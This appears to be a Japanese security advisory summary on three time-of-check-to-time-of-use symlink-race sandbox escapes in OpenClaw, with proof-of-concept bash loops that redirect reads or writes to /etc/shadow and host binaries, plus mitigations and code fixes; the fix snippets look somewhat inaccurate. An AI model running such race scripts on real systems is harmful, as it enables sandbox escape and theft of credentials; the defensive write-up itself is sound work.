# TOCTOU (Time-of-Check to Time-of-Use) 脆弱性

## 概要

TOCTOU（Time-of-Check to Time-of-Use）攻撃は、パス検証（Check）とファイル操作（Use）の間のレースコンディションを悪用し、レースウィンドウ中にシンボリックリンクを差し替えることでサンドボックス境界を突破する攻撃手法です。これは、従来の静的なシンボリックリンク/ハードリンクバイパスを超えた**新しい攻撃パターン**で、v2026.3.1-3.2で発見・修正されました。

TOCTOU攻撃は特に危険です：
- 静的なパス検証が正しくてもサンドボックス境界をバイパス可能
- タイミング精度のみが必要（ミリ秒単位のレースウィンドウ）
- `writeFileWithinRoot`のような適切に設計されたセキュリティ関数に対しても有効

## 統計情報

| 項目 | 値 |
|------|-----|
| 脆弱性総数 | 3件のTOCTOU脆弱性 |
| 深刻度分布 | Medium: 3件 |
| 影響バージョン | v2026.3.0以前 |
| 最新修正バージョン | >= v2026.3.2 |
| 影響 | サンドボックスエスケープ、任意ファイル読み取り/書き込み |

## 攻撃の原理

```
[通常のフロー]
1. アプリケーションがパス "/sandbox/file.txt" を検証 → OK（サンドボックス内）
2. アプリケーションがパス "/sandbox/file.txt" にファイルを書き込み

[TOCTOU攻撃]
1. アプリケーションがパス "/sandbox/file.txt" を検証 → OK（サンドボックス内）
   ← 攻撃者がこの瞬間に "/sandbox/file.txt" を "/etc/passwd" へのシンボリックリンクに差し替え
2. アプリケーションがパス "/sandbox/file.txt" にファイルを書き込み → 実際には "/etc/passwd" に書き込み
```

レースウィンドウは通常数ミリ秒ですが、攻撃者は以下の方法で成功確率を上げることができます：
- タイトループで攻撃を実行
- 複数スレッドを使用してタイミングカバレッジを最大化
- システムの遅延を悪用（高CPU負荷、I/O競合）

---

## 脆弱性リスト

### GHSA-7xmq-g46g-f8pv: サンドボックスメディアTOCTOU

| 項目 | 値 |
|------|-----|
| 深刻度 | Medium |
| CVE | なし |
| 修正バージョン | >= 2026.3.1 |
| カテゴリ | TOCTOU / サンドボックスエスケープ |
| 対象 | サンドボックスメディアファイル読み取り操作 |

**説明**:
サンドボックスメディアのファイル読み取り操作において、パス検証とファイル読み取りの間にレースウィンドウが存在しました。攻撃者はこのウィンドウ中に検証済みパスをサンドボックス外ファイルへのシンボリックリンクに置き換えることができます。

**影響**:
- サンドボックス境界外の任意ファイル読み取り
- 認証情報の窃取（設定ファイル、シークレット）
- 情報漏洩

**攻撃シナリオ**:
```bash
# 1. サンドボックス内に正当なファイルを作成
echo "legitimate" > /sandbox/media/file.txt

# 2. レースコンディション攻撃（タイトループ）
while true; do
  # 機密ファイルへのシンボリックリンクに置き換え
  rm /sandbox/media/file.txt
  ln -s /etc/shadow /sandbox/media/file.txt
  # 元のファイルに戻す
  rm /sandbox/media/file.txt
  echo "legitimate" > /sandbox/media/file.txt
done &

# 3. OpenClawが/sandbox/media/file.txtを読み取ろうとする
# → 一定割合の読み取りがシンボリックリンク状態を捕捉 → /etc/shadowを読み取り
```

**緩和策**:
- v2026.3.1以降にアップデート（O_NOFOLLOWを使用したアトミックファイル操作を使用）
- サンドボックスモードを有効化: `openclaw config set sandbox all`

**参考情報**:
- [GHSA-7xmq-g46g-f8pv](https://github.com/openclaw/openclaw/security/advisories/GHSA-7xmq-g46g-f8pv)
- [サンドボックスエスケープテストガイド](../test-cases/sandbox-escape-guide.md#test-5)

---

### GHSA-x82f-27x3-q89c: writeFileWithinRoot TOCTOUシンボリックリンクレース

| 項目 | 値 |
|------|-----|
| 深刻度 | Medium |
| CVE | なし |
| 修正バージョン | >= 2026.3.1 |
| カテゴリ | TOCTOU / サンドボックスエスケープ |
| 対象 | writeFileWithinRoot関数 |

**説明**:
`writeFileWithinRoot`は、サンドボックスルート内へのファイル書き込みのみを保証するように設計されています。しかし、パス検証とファイル書き込み操作の間にレースウィンドウが存在し、シンボリックリンクの置き換えによりサンドボックス境界外への書き込みが可能でした。

**影響**:
- サンドボックス外への任意ファイル作成
- ファイルの切り詰め（0バイト上書きによるDoS）
- セキュリティ設定の上書き

**攻撃シナリオ**:
```bash
# 概念実証攻撃スクリプト
# 1. サンドボックス内にディレクトリを作成
mkdir -p /sandbox/workspace/target_dir

# 2. レースコンディション攻撃（ディレクトリをシンボリックリンクに置き換え）
while true; do
  rm -rf /sandbox/workspace/target_dir
  ln -s /host/sensitive/path /sandbox/workspace/target_dir
  mkdir -p /sandbox/workspace/target_dir
done &

# 3. writeFileWithinRootが"/sandbox/workspace/target_dir/file"に書き込もうとする
# → 一部の書き込みがシンボリックリンク状態を捕捉 → "/host/sensitive/path/file"に書き込み
```

**緩和策**:
- v2026.3.1以降にアップデート（O_NOFOLLOWとディレクトリファイルディスクリプタ検証を使用）
- ユーザー制御のディレクトリ構造への書き込みを避ける

**参考情報**:
- [GHSA-x82f-27x3-q89c](https://github.com/openclaw/openclaw/security/advisories/GHSA-x82f-27x3-q89c)
- [サンドボックスエスケープテストガイド](../test-cases/sandbox-escape-guide.md#test-5)

---

### GHSA-r54r-wmmq-mh84: 親シンボリックリンク再バインドによるZIP展開レース

| 項目 | 値 |
|------|-----|
| 深刻度 | Medium |
| CVE | なし |
| 修正バージョン | >= 2026.3.2 |
| カテゴリ | TOCTOU / パストラバーサル |
| 対象 | ZIP/アーカイブ展開 |

**説明**:
ZIPアーカイブの展開中に、攻撃者は親ディレクトリのシンボリックリンクを置き換えて、意図しない場所への書き込みをリダイレクトできます。

**影響**:
- 意図した宛先外へのファイル書き込み
- スキルインストールの悪用によるサンドボックス外への書き込み
- 実行ファイルの上書きによる任意コード実行

**攻撃シナリオ**:
```bash
# 悪意あるZIP構造
malicious.zip:
  └── ../../evil/payload.sh  # パストラバーサル試行

# 攻撃:
# 1. 展開ディレクトリを作成
mkdir -p /sandbox/extract/subdir

# 2. 親をシンボリックリンクに置き換えるレース
while true; do
  rm -rf /sandbox/extract
  ln -s /host/system/bin /sandbox/extract
  mkdir -p /sandbox/extract/subdir
done &

# 3. ZIP展開が/sandbox/extract/subdir/...に書き込み
# → 一部の展開がシンボリックリンク状態を捕捉 → /host/system/bin/...に書き込み
```

**緩和策**:
- v2026.3.2以降にアップデート（展開中に親ディレクトリの安定性を検証）
- 信頼されたソースからのみスキルをインストール

**参考情報**:
- [GHSA-r54r-wmmq-mh84](https://github.com/openclaw/openclaw/security/advisories/GHSA-r54r-wmmq-mh84)
- [サンドボックスエスケープテストガイド](../test-cases/sandbox-escape-guide.md#test-6)

---

## 関連する静的シンボリックリンクバイパス

TOCTOU攻撃は、従来の静的シンボリックリンク操作技術の上に構築されています：

| GHSA ID | 深刻度 | 手法 | 修正バージョン |
|---------|--------|------|--------------|
| GHSA-qcc4-p59m-p54m | High | ダングリングシンボリックリンク | 2026.2.26 |
| GHSA-mgrq-9f93-wpp5 | High | 存在しないシンボリックリンクリーフ | 2026.2.26 |
| GHSA-3jx4-q2m7-r496 | High | ハードリンクエイリアス | 2026.2.25 |
| GHSA-cfvj-7rx7-fc7c | Medium | stageSandboxMediaトラバーサル | 2026.3.2 |

**主要な違い**: 静的シンボリックリンク攻撃は、検証を通過する既存のシンボリックリンクに依存しますが、TOCTOU攻撃は**検証後のレースウィンドウ中にシンボリックリンクを作成**します。

---

## 攻撃パターンの進化

```
Phase 1: 静的シンボリックリンク/ハードリンクバイパス (v2026.1.x ~ v2026.2.x)
├── ダングリングシンボリックリンク (GHSA-qcc4)
├── 存在しないシンボリックリンクリーフ (GHSA-mgrq)
├── ハードリンクエイリアス (GHSA-3jx4)
└── パストラバーサル (パス内の../)

Phase 2: 動的TOCTOU攻撃 (v2026.3.1で発見・修正)
├── サンドボックスメディアTOCTOU (GHSA-7xmq)
├── writeFileWithinRootシンボリックリンクレース (GHSA-x82f)
└── ZIP展開レース (GHSA-r54r、v2026.3.2で修正)

Phase 3: ACP継承バイパス (v2026.3.1-3.2で発見・修正)
├── sessions_spawnサンドボックス継承バイパス
└── ホストACPセッション初期化バイパス
```

---

## 防御戦略

### 即時対応
1. **最新バージョンへアップデート**: v2026.3.2以降にアップグレードしてTOCTOU修正を適用
2. **サンドボックスモードを有効化**: `openclaw config set sandbox all` で影響範囲を制限
3. **ファイル操作を監査**: ユーザー制御パスへの書き込みを行うコードをレビュー

### 技術的緩和策（開発者向け）

**アトミックファイル操作を使用**:
```javascript
// BEFORE（TOCTOUに脆弱）:
if (isPathWithinRoot(path)) {
  fs.writeFileSync(path, data);  // ここにレースウィンドウ
}

// AFTER（TOCTOU耐性あり）:
const fd = fs.openSync(path, 'w', { flag: O_NOFOLLOW | O_CREAT | O_EXCL });
fs.writeSync(fd, data);
fs.closeSync(fd);
```

**ディレクトリファイルディスクリプタを使用**:
```javascript
// 親ディレクトリを最初に開く
const dirFd = fs.openSync(parentDir, 'r', { flag: O_DIRECTORY });

// 親が置き換えられていないことを検証
verifyDirectoryIdentity(dirFd, parentDir);

// dirFdに相対的に操作を実行（TOCTOUを防止）
fs.writeFileSync('filename', data, { fd: dirFd });
```

**シンボリックリンクのフォローを避ける**:
- すべてのファイル操作に`O_NOFOLLOW`フラグを使用
- シンボリックリンクを検出するために`stat()`の代わりに`lstat()`を使用
- セキュリティクリティカルなパスではシンボリックリンク上の操作を完全に拒否

### 長期的解決策
- ケイパビリティベースのファイルアクセスを実装（パスベース操作なし）
- ファイルシステムサンドボックスを使用（例: seccomp-bpf、Landlock）
- ステートレス検証を検討（暗号チェックサム）

---

## 関連リソース

- [TOCTOUサンドボックスバイパス調査](../../knowledge/vulnerabilities/sandbox-escape/2026-03-12-toctou-sandbox-bypass.md)
- [サンドボックスエスケープテストガイド](../test-cases/sandbox-escape-guide.md)
- [ハードニングガイド](../best-practices/hardening-guide.md)
- [OpenClaw セキュリティアドバイザリ](https://github.com/openclaw/openclaw/security/advisories)

---

**最終更新**: 2026-03-15
**データベースバージョン**: vulnerability-db.json (2026-03-11、3件のTOCTOUエントリ)
